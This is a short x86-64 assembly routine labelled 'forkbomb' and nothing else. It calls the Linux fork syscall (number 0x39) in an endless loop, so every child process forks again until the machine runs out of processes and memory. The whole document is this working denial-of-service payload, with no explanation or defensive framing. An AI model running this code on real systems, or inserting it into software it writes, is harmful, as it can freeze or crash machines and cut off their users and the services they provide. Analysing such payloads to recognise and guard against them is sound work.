
forkbomb:
	push 0x39
	pop rax
	syscall
	jmp short forkbomb
